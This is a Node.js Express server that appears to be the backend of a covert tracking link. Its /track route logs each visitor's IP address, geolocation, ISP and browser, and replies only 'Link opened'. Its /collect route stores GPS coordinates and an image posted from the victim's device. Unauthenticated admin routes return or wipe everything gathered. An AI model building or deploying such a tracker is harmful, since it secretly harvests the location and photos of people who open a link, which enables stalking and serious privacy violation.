const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

require("dotenv").config();

const app = express();

/* Middleware */
app.use(cors());
app.use(express.json({ limit: "10mb" }));

/* =======================
   MongoDB Connection
======================= */
async function connectionDB() {
  try {
    if (mongoose.connection.readyState === 1) return;

    await mongoose.connect(process.env.dbURL);
    console.log("MongoDB connected");
  } catch (err) {
    console.error("MongoDB connection failed:", err);
    process.exit(1); // Render restart
  }
}

/* =======================
   Schemas
======================= */
const dataSchema = new mongoose.Schema(
  {
    latitude: String,
    longitude: String,
    image: String,
    userAgent: String,
    time: String,
  },
  { timestamps: true }
);

const trackerSchema = new mongoose.Schema(
  {
    ip: String,
    userAgent: String,
    time: String,
    country: String,
    region: String,
    city: String,
    latitude: Number,
    longitude: Number,
    isp: String,
  },
  { timestamps: true }
);

/* =======================
   Models (SAFE)
======================= */
const CollectedData =
  mongoose.models.CollectedData ||
  mongoose.model("CollectedData", dataSchema);

const TrackedData =
  mongoose.models.TrackedData ||
  mongoose.model("TrackedData", trackerSchema);

/* =======================
   Routes
======================= */

app.get("/", (req, res) => {
  res.send("Backend is running 🚀");
});

app.post("/collect", async (req, res) => {
  try {
    await connectionDB();
    await CollectedData.create(req.body);
    res.json({ message: "Data stored successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to store data" });
  }
});

app.get("/admin/data", async (req, res) => {
  try {
    await connectionDB();
    const allData = await CollectedData.find().sort({ createdAt: -1 });
    res.json(allData);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to fetch data" });
  }
});

app.delete("/admin/clear", async (req, res) => {
  try {
    await connectionDB();
    const result = await CollectedData.deleteMany({});
    res.json({ message: `Deleted ${result.deletedCount} records` });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to clear data" });
  }
});

app.get("/track", async (req, res) => {
  try {
    await connectionDB();

    let ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket.remoteAddress;

    if (ip === "::1" || ip === "127.0.0.1") {
      ip = "8.8.8.8";
    }

    ip = ip.replace("::ffff:", "");

    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const location = await response.json();

    await TrackedData.create({
      ip,
      userAgent: req.headers["user-agent"],
      time: new Date().toLocaleString("en-IN", {
        dateStyle: "medium",
        timeStyle: "short",
      }),
      country: location.country_name,
      region: location.region,
      city: location.city,
      latitude: location.latitude,
      longitude: location.longitude,
      isp: location.org,
    });

    res.send("Link opened");
  } catch (err) {
    console.error("Track error:", err);
    res.status(500).send("Tracking failed");
  }
});

app.get("/tracked/data", async (req, res) => {
  try {
    await connectionDB();
    const allData = await TrackedData.find().sort({ createdAt: -1 });
    res.status(200).json(allData);
  } catch (err) {
    console.error("Tracked data error:", err);
    res.status(500).json({ error: "Failed to fetch tracked data" });
  }
});

/* =======================
   Server Start (Render)
======================= */
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
